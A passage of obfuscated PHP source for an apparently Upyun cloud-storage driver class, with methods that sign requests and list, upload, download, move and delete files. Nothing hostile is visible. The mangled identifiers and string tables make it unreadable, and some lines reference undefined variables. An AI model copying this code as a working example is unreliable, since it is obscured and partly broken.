$ß’…–‚Ó[12]) { return $GLOBALS[$ß’…–‚Ó[6]][$ß’…–‚Ó[468]]; } } } goto EºÌ¼™ÍÃ; f½åŸ†¡Ïí: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\160\72\57\x2f\166\x30\56\x61\160\x69\56\165\160\x79\x75\x6e\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($õóâ‚ï´) { parent::__construct(); $this->_init($õóâ‚ï´); } public function _init($éóê–ŒÇ) { $½ÉşºÆÃ =& $_SERVER[¿ÈˆÑ¸ä]; foreach ($éóê–ŒÇ as $ÌÃÁèÌü => $Ü¬İÃã¹) { if (isset($this->{$ÌÃÁèÌü})) { $this->{$ÌÃÁèÌü} = $Ü¬İÃã¹; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($½ÉşºÆÃ[1686] . LNG($½ÉşºÆÃ[1609])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($áá’íú, $´Ò¼«„× = "\x47\x45\x54") { $®îøˆåÓ =& $_SERVER[¿ÈˆÑ¸ä]; $ŞÓıÜ Å = gmdate($®îøˆåÓ[1638]); $˜î¿×’´ = base64_encode(hash_hmac($®îøˆåÓ[1687], "{$´Ò¼«„×}\x26{$áá’íú}\46{$ŞÓıÜ Å}", md5("{$this->userpass}"), !0)); $–ƒ» » = array("\101\x75\164\150\157\162\x69\172\x61\x74\x69\157\x6e\72\x55\120\x59\x55\116\40{$this->username}\72{$˜î¿×’´}", "\x44\141\x74\145\72{$ŞÓıÜ Å}"); return $–ƒ» »; } public function ussRequest($Ÿ¨¨¸•ò, $¦ÉÙÖÓ¹ = "\107\105\x54", $•—ÏŸŠ¥ = false, $¿¨¸„ûÙ = false, $Î¨û°¦³ = false) { $ï‰“¼€º =& $_SERVER[¿ÈˆÑ¸ä]; $Ÿ¨¨¸•ò = trim($Ÿ¨¨¸•ò, $ï‰“¼€º[8]); $Ì‡°…ÙÁ = "\x2f{$this->bucket}\57" . rawurlencode($Ÿ¨¨¸•ò); $í¬—É½ = $this->ussHeaders($Ì‡°…ÙÁ, $¦ÉÙÖÓ¹); if ($¿¨¸„ûÙ) { $í¬—É½ = array_merge($í¬—É½, $¿¨¸„ûÙ); } $Í“ÒÛüÍ = url_request($this->endpoint . $Ì‡°…ÙÁ, $¦ÉÙÖÓ¹, $•—ÏŸŠ¥, $í¬—É½, $Î¨û°¦³); if (!$Í“ÒÛüÍ) { $÷îÕãœê = LNG($ï‰“¼€º[1688]); $this->writeLog($÷îÕãœê); return array($ï‰“¼€º[1336] => !1, $ï‰“¼€º[1326] => $÷îÕãœê); } if (strtolower($¦ÉÙÖÓ¹) == $ï‰“¼€º[228] || in_array($Í“ÒÛüÍ[$ï‰“¼€º[1336]], array($ï‰“¼€º[262], $ï‰“¼€º[1689]))) { $•—ÏŸŠ¥ = $Í“ÒÛüÍ[$ï‰“¼€º[1690]]; if (!$Í“ÒÛüÍ[$ï‰“¼€º[833]]) { $•—ÏŸŠ¥ = isset($•—ÏŸŠ¥[0]) ? $•—ÏŸŠ¥[0] : $ï‰“¼€º[12]; } } else { $•—ÏŸŠ¥ = json_decode($Í“ÒÛüÍ[$ï‰“¼€º[1326]], !0); if (!$•—ÏŸŠ¥) { $•—ÏŸŠ¥ = $Í“ÒÛüÍ[$ï‰“¼€º[1326]]; } else { if (!$Í“ÒÛüÍ[$ï‰“¼€º[833]] && isset($•—ÏŸŠ¥[$ï‰“¼€º[1691]])) { $•—ÏŸŠ¥ = $•—ÏŸŠ¥[$ï‰“¼€º[1691]]; } } } if (!$Í“ÒÛüÍ[$ï‰“¼€º[833]]) { $this->writeLog($this->__errorMessage($•—ÏŸŠ¥)); } return array($ï‰“¼€º[1336] => $Í“ÒÛüÍ[$ï‰“¼€º[833]], $ï‰“¼€º[1326] => $•—ÏŸŠ¥); } private function __errorMessage($±ïù’¤) { $”õ™±ä² =& $_SERVER[¿ÈˆÑ¸ä]; if (!$±ïù’¤) { return $”õ™±ä²[12]; } static $´­à…ı† = null; if (!$´­à…ı†) { $´­à…ı† = I18n::getType(); } if ($´­à…ı† != $”õ™±ä²[1646]) { return $±ïù’¤; } $Ø¾ç¬• = array($”õ™±ä²[1692] => $”õ™±ä²[1693], $”õ™±ä²[1694] => $”õ™±ä²[1695], $”õ™±ä²[1696] => $”õ™±ä²[1695], $”õ™±ä²[1697] => $”õ™±ä²[1698], $”õ™±ä²[1699] => $”õ™±ä²[1700], $”õ™±ä²[1701] => $”õ™±ä²[1702], $”õ™±ä²[1703] => $”õ™±ä²[1704]); return isset($Ø¾ç¬•[$±ïù’¤]) ? $Ø¾ç¬•[$±ïù’¤] : $±ïù’¤; } public function mkfile($õ¹¢ñ, $„´ıê© = '', $ş¶§¨Ãı = REPEAT_RENAME) { if ($this->setContent($õ¹¢ñ, $„´ıê©)) { return $this->getPathOuter($õ¹¢ñ); } return !1; } public function mkdir($³èöş, $®ƒŞ¥˜ú = REPEAT_SKIP) { $£˜Ô¦³ =& $_SERVER[¿ÈˆÑ¸ä]; $³ğîÕ©Ü = trim($³èöş, $£˜Ô¦³[8]); if ($this->_isFolder($³ğîÕ©Ü)) { return $this->getPathOuter($³ğîÕ©Ü); } $ë¢ˆ©†ˆ = array($£˜Ô¦³[1705]); $…½•¢Í— = $this->ussRequest($³ğîÕ©Ü, $£˜Ô¦³[289], !1, $ë¢ˆ©†ˆ); return $…½•¢Í—[$£˜Ô¦³[1336]] ? $this->getPathOuter($³ğîÕ©Ü) : !1; } public function copyFile($²ÁÅÔ©, $à¸‹ª×) { $úï¨‰ƒœ =& $_SERVER[¿ÈˆÑ¸ä]; $í¹¿ø£œ = array($úï¨‰ƒœ[1706] . "\x2f{$this->bucket}\x2f{$²ÁÅÔ©}", $úï¨‰ƒœ[1707]); $“ü­µúŒ = $this->ussRequest($à¸‹ª×, $úï¨‰ƒœ[254], !1, $í¹¿ø£œ); return $“ü­µúŒ[$úï¨‰ƒœ[1336]] ? !0 : $this->getPathOuter($à¸‹ª×); } public function moveFile($ê¤ƒßŸ«, $Ï‰ë”şú) { $ùÇï°”– =& $_SERVER[¿ÈˆÑ¸ä]; $Š¸Ó—¡ = array($ùÇï°”–[1708] . "\57{$this->bucket}\x2f{$ê¤ƒßŸ«}", $ùÇï°”–[1707]); $ş´—¥æŒ = $this->ussRequest($Ï‰ë”şú, $ùÇï°”–[254], !1, $Š¸Ó—¡); return $ş´—¥æŒ[$ùÇï°”–[1336]] ? !0 : $this->getPathOuter($Ï‰ë”şú); } public function delFile($¡„èÚ¾ã) { $Üş®ôã¼ =& $_SERVER[¿ÈˆÑ¸ä]; $ ãÓ†¬Ş = $this->ussRequest($¡„èÚ¾ã, $Üş®ôã¼[1709]); return $ ãÓ†¬Ş[$Üş®ôã¼[1336]] ? !0 : !1; } public function delFolder($ÙäıŠ¦È) { $™Ó¦˜ËÅ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->exist($ÙäıŠ¦È)) { return !0; } $this->listItemCache = !1; $¤œ¡½¢ = $Ù·Èëó¾ = array(); $this->fileList($ÙäıŠ¦È, $¤œ¡½¢, $Ù·Èëó¾, !0); $this->listItemCache = !0; foreach ($Ù·Èëó¾ as $§·„æŞ ) { $´íÜüŸÎ = $this->ussRequest($§·„æŞ [$™Ó¦˜ËÅ[32]], $™Ó¦˜ËÅ[1709]); if (!$´íÜüŸÎ[$™Ó¦˜ËÅ[1336]]) { return !1; } } usort($¤œ¡½¢, function ($ûŞ„Ñ•Ş, $óîî¥–) { $îÄöĞñÔ =& $_SERVER[¿ÈˆÑ¸ä]; return substr_count($óîî¥–, $îÄöĞñÔ[8]) - substr_count($ûŞ„Ñ•Ş, $îÄöĞñÔ[8]); }); foreach ($¤œ¡½¢ as $ŸÅöÛ­§) { $´íÜüŸÎ = $this->ussRequest($ŸÅöÛ­§, $™Ó¦˜ËÅ[1709]); if (!$´íÜüŸÎ[$™Ó¦˜ËÅ[1336]]) { return !1; } } $´íÜüŸÎ = $this->ussRequest($ÙäıŠ¦È, $™Ó¦˜ËÅ[1709]); return $´íÜüŸÎ[$™Ó¦˜ËÅ[1336]]; } public function rename($ªÚ¥‹Í, $…ÜÎîå) { if ($this->isFile($ªÚ¥‹Í)) { $…ÜÎîå = get_path_father($ªÚ¥‹Í) . $…ÜÎîå; return $this->moveFile($ªÚ¥‹Í, $…ÜÎîå); } return $this->renameObject($ªÚ¥‹Í, $…ÜÎîå); } public function fileInfo($Ö‰£“ıÃ, $´³İÈñ‘ = false, $š¥ŸÆ¼˜ = array()) { $¥ø²ú¿ =& $_SERVER[¿ÈˆÑ¸ä]; $èîÒÁ¼ˆ = array($¥ø²ú¿[32] => $this->pathThis($Ö‰£“ıÃ), $¥ø²ú¿[87] => $this->getPathOuter($¥ø²ú¿[8] . $Ö‰£“ıÃ), $¥ø²ú¿[33] => $¥ø²ú¿[231], $¥ø²ú¿[79] => isset($š¥ŸÆ¼˜[$¥ø²ú¿[79]]) ? $š¥ŸÆ¼˜[$¥ø²ú¿[79]] : 0, $¥ø²ú¿[167] => $this->ext($Ö‰£“ıÃ)); if ($´³İÈñ‘) { return $èîÒÁ¼ˆ; } $èîÒÁ¼ˆ[$¥ø²ú¿[232]] = $èîÒÁ¼ˆ[$¥ø²ú¿[88]] = 0; $èîÒÁ¼ˆ[$¥ø²ú¿[233]] = $èîÒÁ¼ˆ[$¥ø²ú¿[234]] = !0; if (empty($š¥ŸÆ¼˜)) { $š¥ŸÆ¼˜ = $this->objectMeta($Ö‰£“ıÃ); if (!$š¥ŸÆ¼˜) { return $èîÒÁ¼ˆ; } } $èîÒÁ¼ˆ[$¥ø²ú¿[232]] = intval($š¥ŸÆ¼˜[$¥ø²ú¿[1710]]); $èîÒÁ¼ˆ[$¥ø²ú¿[88]] = intval($š¥ŸÆ¼˜[$¥ø²ú¿[1711]]); $èîÒÁ¼ˆ[$¥ø²ú¿[79]] = $š¥ŸÆ¼˜[$¥ø²ú¿[79]]; return $èîÒÁ¼ˆ; } public function folderInfo($Â…œ¦Í , $­›™ÏŸØ = false) { $šßåíó¦ =& $_SERVER[¿ÈˆÑ¸ä]; $¸ÊõÏœ = array($šßåíó¦[32] => $this->pathThis($Â…œ¦Í ), $šßåíó¦[87] => $this->getPathOuter($šßåíó¦[8] . $Â…œ¦Í ), $šßåíó¦[33] => $šßåíó¦[78]); if ($­›™ÏŸØ) { return $¸ÊõÏœ; } $¸ÊõÏœ[$šßåíó¦[232]] = $¸ÊõÏœ[$šßåíó¦[88]] = 0; $¸ÊõÏœ[$šßåíó¦[233]] = $¸ÊõÏœ[$šßåíó¦[234]] = !0; if (empty($èÊÂË÷Ó)) { $èÊÂË÷Ó = $this->objectMeta($Â…œ¦Í ); if (!$èÊÂË÷Ó) { return $¸ÊõÏœ; } } $¸ÊõÏœ[$šßåíó¦[232]] = intval($èÊÂË÷Ó[$šßåíó¦[1710]]); $¸ÊõÏœ[$šßåíó¦[88]] = intval($èÊÂË÷Ó[$šßåíó¦[1711]]); return $¸ÊõÏœ; } private function listObjs($ƒå‹Ôİİ, $Ö™¿Ëğµ = 0, $¾³§‹¶â = 1000) { $Ñşá¶äë =& $_SERVER[¿ÈˆÑ¸ä]; $­‡ŞÍÛô = array($Ñşá¶äë[1712], $Ñşá¶äë[1713] . $¾³§‹¶â); if ($Ö™¿Ëğµ) { $­‡ŞÍÛô[] = $Ñşá¶äë[1714] . $Ö™¿Ëğµ; } $£¸¾Êƒ¢ = $this->ussRequest($ƒå‹Ôİİ, $Ñşá¶äë[1542], !1, $­‡ŞÍÛô); return !$£¸¾Êƒ¢[$Ñşá¶äë[1336]] ? !1 : $£¸¾Êƒ¢[$Ñşá¶äë[1326]]; } private function fileList($„Çõ–ó©, &$³‘ô‡š, &$öÊˆ©Ò, $×º«â¬„ = false) { $©›ÆùÀ¹ =& $_SERVER[¿ÈˆÑ¸ä]; $Š‡…İ­Ö = $©›ÆùÀ¹[12]; $´¹Ú…¹© = 1000; $Çîâ©Ô› = rtrim($„Çõ–ó©, $©›ÆùÀ¹[8]) . $©›ÆùÀ¹[8]; while (!0) { check_abort(); $¨Ë¿«« = $this->listObjs($„Çõ–ó©, $Š‡…İ­Ö, $´¹Ú…¹©); if (!$¨Ë¿««) { return !1; } $Š‡…İ­Ö = isset($¨Ë¿««[$©›ÆùÀ¹[1715]]) ? $¨Ë¿««[$©›ÆùÀ¹[1715]] : $©›ÆùÀ¹[12]; $ôåèÉÔá = isset($¨Ë¿««[$©›ÆùÀ¹[1716]]) ? $¨Ë¿««[$©›ÆùÀ¹[1716]] : array(); foreach ($ôåèÉÔá as $µéëÕ˜Ç) { $´à¸³Ë = $µéëÕ˜Ç[$©›ÆùÀ¹[33]] == $©›ÆùÀ¹[78] ? !0 : !1; $ÉÔíçãÄ = ltrim($Çîâ©Ô› . $µéëÕ˜Ç[$©›ÆùÀ¹[32]], $©›ÆùÀ¹[8]) . ($´à¸³Ë ? $©›ÆùÀ¹[8] : $©›ÆùÀ¹[12]); $³Íşçš = array($©›ÆùÀ¹[32] => $ÉÔíçãÄ, $©›ÆùÀ¹[33] => $´à¸³Ë ? $©›ÆùÀ¹[78] : $©›ÆùÀ¹[231], $©›ÆùÀ¹[79] => $µéëÕ˜Ç[$©›ÆùÀ¹[413]], $©›ÆùÀ¹[1711] => $µéëÕ˜Ç[$©›ÆùÀ¹[1717]]); $this->cacheMethodInfoSet($ÉÔíçãÄ, $´à¸³Ë, $³Íşçš); if ($´à¸³Ë) { $³‘ô‡š[] = $ÉÔíçãÄ; if ($×º«â¬„) { $this->fileList($ÉÔíçãÄ, $³‘ô‡š, $öÊˆ©Ò, $×º«â¬„); } continue; } $öÊˆ©Ò[] = $³Íşçš; } if (count($ôåèÉÔá) < $´¹Ú…¹©) { break; } } $this->cacheMethodInfoSet($„Çõ–ó©, !0); } public function listPath($Æ«öêø, $¨·ˆ–©İ = false) { $æİ×ÄÕØ =& $_SERVER[¿ÈˆÑ¸ä]; $ï±çªã = $ÚãåÛò› = array(); $this->fileList($Æ«öêø, $ï±çªã, $ÚãåÛò›); foreach ($ï±çªã as $Ù›ÅœÍ => $¹ì¡«ñê) { $ï±çªã[$Ù›ÅœÍ] = $this->folderInfo($¹ì¡«ñê, $¨·ˆ–©İ); } foreach ($ÚãåÛò› as $Ù›ÅœÍ => $¹ì¡«ñê) { $ÚãåÛò›[$Ù›ÅœÍ] = $this->fileInfo($¹ì¡«ñê[$æİ×ÄÕØ[32]], $¨·ˆ–©İ, $¹ì¡«ñê); } return array($æİ×ÄÕØ[85] => $ï±çªã, $æİ×ÄÕØ[86] => $ÚãåÛò›); } public function has($‡ïàç™æ, $ªœúÀç´ = false, $Ãòë¨¢ = true) { $—äïˆäñ =& $_SERVER[¿ÈˆÑ¸ä]; $Üğ‰Ã‚õ = $—äïˆäñ[12]; $™ëØ½È = 500; $ŒÚöë†¥ = 0; $÷š°Ê«Ø = 0; $ß‘åé»Š = rtrim($‡ïàç™æ, $—äïˆäñ[8]) . $—äïˆäñ[8]; while (!0) { check_abort(); $“âˆÍ = $this->listObjs($‡ïàç™æ, $Üğ‰Ã‚õ, $™ëØ½È); if (!$“âˆÍ) { return !1; } $Üğ‰Ã‚õ = isset($“âˆÍ[$—äïˆäñ[1715]]) ? $“âˆÍ[$—äïˆäñ[1715]] : $—äïˆäñ[12]; $ôäã£¥ = isset($“âˆÍ[$—äïˆäñ[1716]]) ? $“âˆÍ[$—äïˆäñ[1716]] : array(); if (empty($ôäã£¥)) { break; } $¸£“Õ¬¨ = array_filter($ôäã£¥, function ($¼¸ ã…¨) { $ö†í£Ñ =& $_SERVER[¿ÈˆÑ¸ä]; return $¼¸ ã…¨[$ö†í£Ñ[33]] == $ö†í£Ñ[78]; }); $Øæ¼ú»° = count($ôäã£¥); $¸£“Õ¬¨ = count($¸£“Õ¬¨); $©ÒÈ§ÇÇ = $Øæ¼ú»° - $¸£“Õ¬¨; if ($ªœúÀç´) { $÷š°Ê«Ø += $¸£“Õ¬¨; $ŒÚöë†¥ += $©ÒÈ§ÇÇ; if ($Øæ¼ú»° < $™ëØ½È) { break; } continue; } if ($Ãòë¨¢) { if ($©ÒÈ§ÇÇ) { return !0; } } else { if ($¸£“Õ¬¨) { return !0; } } if ($Øæ¼ú»° < $™ëØ½È) { break; } } if ($ªœúÀç´) { return array($—äïˆäñ[240] => $ŒÚöë†¥, $—äïˆäñ[241] => $÷š°Ê«Ø); } return !1; } public function listAll($µ±šÛüÛ) { $É¼ÉÓ² =& $_SERVER[¿ÈˆÑ¸ä]; $ú°ªÇêØ = $Óåâ­¢Ë = array(); $this->fileList($µ±šÛüÛ, $ú°ªÇêØ, $Óåâ­¢Ë, !0); $İçö¹­€ = array_to_keyvalue($Óåâ­¢Ë, $É¼ÉÓ²[32]); foreach ($ú°ªÇêØ as $¾³©À‰) { if (is_string($¾³©À‰)) { $İçö¹­€[$¾³©À‰] = array($É¼ÉÓ²[79] => 0); } } return $this->listAllFiles($µ±šÛüÛ, $İçö¹­€); } public function canRead($×«›–Ò) { return $this->exist($×«›–Ò) ? !0 : !1; } public function canWrite($‰ëüÁ±) { return $this->exist($‰ëüÁ±) ? !0 : !1; } public function getContent($š»Ôå›÷) { return $this->fileSubstr($š»Ôå›÷, 0, -1); } public function setContent($¢½ÀÑ®è, $ƒÚ§½å’ = '') { $Øä³§ö¼ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ƒÚ§½å’) { $óº¡½úÊ = $this->ussRequest($¢½ÀÑ®è, $Øä³§ö¼[289]); return $óº¡½úÊ[$Øä³§ö¼[1336]]; } $§Ì•Í÷± = $this->tempFile($this->pathThis($¢½ÀÑ®è)); file_put_contents($§Ì•Í÷±, $ƒÚ§½å’); if ($this->upload($¢½ÀÑ®è, $§Ì•Í÷±)) { $this->tempFileRemve($§Ì•Í÷±); return !0; } return !1; } public function fileSubstr($ ‘¶µ¼Ã, $Îë¿Ù˜, $ŸŞÃ‰¶) { $š¾ßÛÀÑ =& $_SERVER[¿ÈˆÑ¸ä]; if (!($‹«ÍŸ® = $this->link($ ‘¶µ¼Ã))) { return !1; } $íòÂ³Ù = !1; if ($ŸŞÃ‰¶ > 0) { $¶ü‡Øİ = $Îë¿Ù˜ + $ŸŞÃ‰¶ - 1; $íòÂ³Ù = array($š¾ßÛÀÑ[1541] . $Îë¿Ù˜ . $š¾ßÛÀÑ[473] . $¶ü‡Øİ); } $Ş—ï¸’ì = url_request($‹«ÍŸ®, $š¾ßÛÀÑ[1542], !1, $íòÂ³Ù); return $Ş—ï¸’ì[$š¾ßÛÀÑ[833]] ? $Ş—ï¸’ì[$š¾ßÛÀÑ[1326]] : !1; } public function upload($™ŸõÌ†—, $ê˜å¿ˆ, $Ì¿‘Ñ¡Ú = false, $ÀŠûìÌš = REPEAT_REPLACE) { $Üê¿µõá =& $_SERVER[¿ÈˆÑ¸ä]; $ÌÃ¬¿åÆ = IO::size($ê˜å¿ˆ); if ($ÌÃ¬¿åÆ <= 1024 * 1024 * 200) { $ÍÃ¸¨šİ = array($Üê¿µõá[1718] . $ê˜å¿ˆ); $¼Ø‘Š¾ = $this->ussRequest($™ŸõÌ†—, $Üê¿µõá[254], $ÍÃ¸¨šİ); return $¼Ø‘Š¾[$Üê¿µõá[1336]] ? $this->getPathOuter($™ŸõÌ†—) : !1; } $Œôá´«œ = 1024 * 1024 * 10; $¸«ä° = array($Üê¿µõá[1719], $Üê¿µõá[1720] . $ÌÃ¬¿åÆ, $Üê¿µõá[1721], $Üê¿µõá[1722] . $Œôá´«œ); $¼Ø‘Š¾ = $this->ussRequest($™ŸõÌ†—, $Üê¿µõá[254], !1, $¸«ä°); if (!$¼Ø‘Š¾[$Üê¿µõá[1336]]) { return !1; } $åóÅºËµ = $¼Ø‘Š¾[$Üê¿µõá[1326]]; $›´òÃÜ¹ = 0; $äûò±…Ÿ = $åóÅºËµ[$Üê¿µõá[1723]]; $ÂªŸø³‰ = fopen($ê˜å¿ˆ, $Üê¿µõá[1602]); if (!$ÂªŸø³‰) { return !1; } do { $º”÷¬é¸ = $åóÅºËµ[$Üê¿µõá[1724]]; fseek_64($ÂªŸø³‰, $›´òÃÜ¹); $ò¡«‹Û¿ = fread($ÂªŸø³‰, $º”÷¬é¸); $§£†âƒ = 0; do { $§£†âƒ++; $åóÅºËµ = $this->uploadPart($™ŸõÌ†—, $åóÅºËµ, $ò¡«‹Û¿); } while (!$åóÅºËµ && $§£†âƒ < 3); if (!$åóÅºËµ) { return !1; } $äûò±…Ÿ = $åóÅºËµ[$Üê¿µõá[1723]]; $›´òÃÜ¹ += $º”÷¬é¸; } while ($äûò±…Ÿ != -1); fclose($ÂªŸø³‰); $¸«ä° = array($Üê¿µõá[1725], $Üê¿µõá[1726] . $åóÅºËµ[$Üê¿µõá[1727]], $Üê¿µõá[1721]); $¼Ø‘Š¾ = $this->ussRequest($™ŸõÌ†—, $Üê¿µõá[254], !1, $¸«ä°); return $¼Ø‘Š¾[$Üê¿µõá[1336]] ? $this->getPathOuter($É×…ïÉ) : !1; } private function uploadPart($óªÙ†Éä, $ÕƒıÔıî, &$¬•ş¸Şì) { $’ş¸‹ŸÒ =& $_SERVER[¿ÈˆÑ¸ä]; $ÂÀØçŠƒ = array($’ş¸‹ŸÒ[1728], $’ş¸‹ŸÒ[1726] . $ÕƒıÔıî[$’ş¸‹ŸÒ[1727]], $’ş¸‹ŸÒ[1729] . $ÕƒıÔıî[$’ş¸‹ŸÒ[1723]], $’ş¸‹ŸÒ[144] . $ÕƒıÔıî[$’ş¸‹ŸÒ[1724]]); $”À€±é‹ = $this->ussRequest($óªÙ†Éä, $’ş¸‹ŸÒ[254], $¬•ş¸Şì, $ÂÀØçŠƒ); return !$”À€±é‹[$’ş¸‹ŸÒ[1336]] ? $”À€±é‹[$’ş¸‹ŸÒ[1336]] : $”À€±é‹[$’ş¸‹ŸÒ[1326]]; } public function uploadFormData($ë¶ó²», $©Á ğ• = 3600) { return $this->uploadPolicy($ë¶ó²», $©Á ğ•); } public function uploadMultiData($‘ç›ø¹À, $´…ÍÅõ† = 3600) { $îâÁú˜ =& $_SERVER[¿ÈˆÑ¸ä]; $¤†ßÕàÑ = (int) $GLOBALS[$îâÁú˜[7]][$îâÁú˜[79]]; return $this->uploadPolicy($‘ç›ø¹À, $´…ÍÅõ†, $¤†ßÕàÑ); } private function uploadPolicy($ú µı™ø, $†½°›› = 3600, $œëàÎ¿û = 0) { $‰éõ±ü¨ =& $_SERVER[¿ÈˆÑ¸ä]; $Ÿ¸Ÿ’®É = $‰éõ±ü¨[8] . $this->bucket; $–Ç„ïÁÄ = gmdate($‰éõ±ü¨[1638]); $âŠÂÖó = array($‰éõ±ü¨[1730] => $this->bucket, $‰éõ±ü¨[1731] => $ú µı™ø, $‰éõ±ü¨[1732] => time() + $†½°››, $‰éõ±ü¨[1733] => $–Ç„ïÁÄ); if ($œëàÎ¿û) { $âŠÂÖó[$‰éõ±ü¨[1623]] = $œëàÎ¿û; } $“ËÂşì = base64_encode(json_encode($âŠÂÖó)); $³ƒõ­òù = base64_encode(hash_hmac($‰éõ±ü¨[1687], "\120\x4f\x53\124\46{$Ÿ¸Ÿ’®É}\x26{$–Ç„ïÁÄ}\x26{$“ËÂşì}", md5("{$this->userpass}"), !0)); $¢åÌª»å = array($‰éõ±ü¨[278] => $“ËÂşì, $‰éõ±ü¨[1734] => "\x55\120\x59\125\x4e\40{$this->username}\72{$³ƒõ­òù}", $‰éõ±ü¨[207] => $this->endpoint . $Ÿ¸Ÿ’®É); return $¢åÌª»å; } public function download($Š¨ÊƒêÑ, $ŠÃ ı÷ô) { $é´üÇ‚× = IO::getPathInner(IO::mkfile($ŠÃ ı÷ô)); if (!($¯ üñÆ = $this->link($Š¨ÊƒêÑ))) { return !1; } $À‚ğ’­Ü = 0; $‹¸” ¢¹ = 1024 * 200; $é Â½Ä = fopen($é´üÇ‚×, $_SERVER[¿ÈˆÑ¸ä][1682]); while (!0) { $·ò£Ÿá = $this->fileSubstr($Š¨ÊƒêÑ, $À‚ğ’­Ü, $‹¸” ¢¹); if ($·ò£Ÿá === !1) { return !1; } fwrite($é Â½Ä, $·ò£Ÿá); $À‚ğ’­Ü += $‹¸” ¢¹; if (strlen($·ò£Ÿá) < $‹¸” ¢¹) { break; } } fclose($é Â½Ä); return $ŠÃ ı÷ô; } public function link($ÚÕÙ‡™, $£íøšÆ = array()) { $¼ïÀ‹ş =& $_SERVER[¿ÈˆÑ¸ä]; $ÚÕÙ‡™ = trim($ÚÕÙ‡™, $¼ïÀ‹ş[8]); if (!empty($this->token)) { $Õœ»œßÌ = strtotime(date($¼ïÀ‹ş[1735])); $œ—óá»Š = substr(md5($this->token . $¼ïÀ‹ş[285] . $Õœ»œßÌ . $¼ïÀ‹ş[1736] . $ÚÕÙ‡™), 12, 8) . $Õœ»œßÌ; $£íøšÆ[] = $¼ïÀ‹ş[1737] . $œ—óá»Š; } $„ËüÒœ¾ = !empty($£íøšÆ) ? $¼ïÀ‹ş[76] . implode($¼ïÀ‹ş[285], $£íøšÆ) : $¼ïÀ‹ş[12]; return $this->getHost() . $¼ïÀ‹ş[8] . $this->pathEncode($ÚÕÙ‡™) . $„ËüÒœ¾; } public function fileOut($¤ğÃØõØ, $àš¢ú±’ = false, $’œ™Ë± = false, $™¶®õµÌ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¤ğÃØõØ, $àš¢ú±’, $’œ™Ë±, $™¶®õµÌ); } if (!$’œ™Ë±) { $’œ™Ë± = $this->pathThis($¤ğÃØõØ); } $ûÍÏô = $àš¢ú±’ ? array($_SERVER[¿ÈˆÑ¸ä][1738] . rawurlencode($’œ™Ë±)) : array(); $¡ó…õæÏ = $this->link($¤ğÃØõØ, $ûÍÏô); $this->fileOutLink($¡ó…õæÏ); } public function fileOutServer($ÏÇóªİÀ, $å»Ìë÷Á = false, $èƒß…£º = false, $çÖœæûÛ = '') { parent::fileOut($ÏÇóªİÀ, $å»Ìë÷Á, $èƒß…£º, $çÖœæûÛ); } public function fileOutImage($ÀÛêÁÇ, $áŸ¦•Ô = 250) { $»ëœ’í¾ = $this->link($ÀÛêÁÇ . $_SERVER[¿ÈˆÑ¸ä][1739] . $áŸ¦•Ô); $this->fileOutLink($»ëœ’í¾); } public function fileOutImageServer($¿î¦×ŒÏ, $òÙÒùƒÑ = 250) { parent::fileOutImage($¿î¦×ŒÏ, $òÙÒùƒÑ); } public function hashMd5($ü¤ÏŸ­ä) { $œ¸ÒĞÖ¡ =& $_SERVER[¿ÈˆÑ¸ä]; $É»ï¢ùî = $this->_objectMeta($ü¤ÏŸ­ä); return isset($É»ï¢ùî[$œ¸ÒĞÖ¡[246]]) ? $É»ï¢ùî[$œ¸ÒĞÖ¡[246]] : !1; } public function size($åĞ¡œîÜ) { $Å¿İ­ƒà = $this->objectMeta($åĞ¡œîÜ); return $Å¿İ­ƒà ? $Å¿İ­ƒà[$_SERVER[¿ÈˆÑ¸ä][79]] : 0; } public function info($«¦ĞÎ¼) { if ($this->isFolder($«¦ĞÎ¼)) { return $this->folderInfo($«¦ĞÎ¼); } else { if ($this->isFile($«¦ĞÎ¼)) { return $this->fileInfo($«¦ĞÎ¼); } } return !1; } public function exist($È¤§õÍ¯) { return $this->isFile($È¤§õÍ¯) || $this->isFolder($È¤§õÍ¯); } public function isFile($Çò’ÛÆ) { return !$this->isFolder($Çò’ÛÆ) && $this->objectMeta($Çò’ÛÆ); } public function isFolder($çÃÄÓÛÚ) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][178], $çÃÄÓÛÚ); } protected function objectMeta($¿Ş•òó©) { return $this->cacheMethod($_SERVER[¿ÈˆÑ¸ä][180], $¿Ş•òó©); } protected function _objectMeta($íÇùÖö¼) { $ø•ÀÃŸÈ =& $_SERVER[¿ÈˆÑ¸ä]; if ($íÇùÖö¼ == $ø•ÀÃŸÈ[12] || $íÇùÖö¼ == $ø•ÀÃŸÈ[8]) { return array(); } $«Ò¶’ëö = $this->ussRequest($íÇùÖö¼, $ø•ÀÃŸÈ[1740]); if (!$«Ò¶’ëö[$ø•ÀÃŸÈ[1336]]) { return null; } $‹‰¯âåß = isset($«Ò¶’ëö[$ø•ÀÃŸÈ[1326]]) ? $«Ò¶’ëö[$ø•ÀÃŸÈ[1326]] : array(); if (!isset($‹‰¯âåß[$ø•ÀÃŸÈ[1741]])) { return null; } $¢Ï³…œÅ = array($ø•ÀÃŸÈ[33] => isset($‹‰¯âåß[$ø•ÀÃŸÈ[1741]]) ? $‹‰¯âåß[$ø•ÀÃŸÈ[1741]] : null, $ø•ÀÃŸÈ[79] => isset($‹‰¯âåß[$ø•ÀÃŸÈ[1742]]) ? $‹‰¯âåß[$ø•ÀÃŸÈ[1742]] : null, $ø•ÀÃŸÈ[246] => isset($‹‰¯âåß[$ø•ÀÃŸÈ[1743]]) ? $‹‰¯âåß[$ø•ÀÃŸÈ[1743]] : null, $ø•ÀÃŸÈ[1710] => isset($‹‰¯âåß[$ø•ÀÃŸÈ[1744]]) ? $‹‰¯âåß[$ø•ÀÃŸÈ[1744]] : null); $¢Ï³…œÅ[$ø•ÀÃŸÈ[1711]] = isset($‹‰¯âåß[$ø•ÀÃŸÈ[1745]]) ? strtotime($‹‰¯âåß[$ø•ÀÃŸÈ[1745]]) : $¢Ï³…œÅ[$ø•ÀÃŸÈ[1710]]; return $¢Ï³…œÅ; } protected function _isFolder($è±ìñ¿) { $è‰°”ç° =& 